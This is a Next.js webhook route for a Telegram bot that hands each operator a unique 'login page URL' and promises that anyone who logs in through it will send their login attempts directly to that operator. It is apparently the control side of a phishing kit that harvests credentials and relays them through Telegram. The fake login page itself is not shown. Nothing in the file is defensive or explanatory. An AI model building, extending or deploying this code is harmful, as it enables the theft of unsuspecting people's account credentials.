import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const body = await request.json()

    if (!body.message?.text) {
      return NextResponse.json({ ok: true })
    }

    const { message } = body
    const chatId = message.chat.id
    const text = message.text

    if (text === "/start") {
      const welcomeMessage = `Welcome! Use /geturl to generate your unique login page URL.`
      await sendTelegramMessage(chatId, welcomeMessage)
      return NextResponse.json({ ok: true })
    }

    if (text === "/geturl") {
      const baseUrl = process.env.VERCEL_URL || "localhost:3000"
      const protocol = baseUrl.includes("localhost") ? "http" : "https"
      const uniqueUrl = `${protocol}://${baseUrl}/?id=${chatId}`

      const urlMessage = `Here's your unique login page URL:\n${uniqueUrl}\n\nAnyone who logs in through this URL will send their login attempts directly to you.`
      await sendTelegramMessage(chatId, urlMessage)
      return NextResponse.json({ ok: true })
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error("Webhook error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}

async function sendTelegramMessage(chatId: number | string, text: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  if (!botToken) {
    throw new Error("TELEGRAM_BOT_TOKEN is not configured")
  }

  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: "HTML",
    }),
  })

  if (!response.ok) {
    throw new Error("Failed to send Telegram message")
  }

  return await response.json()
}

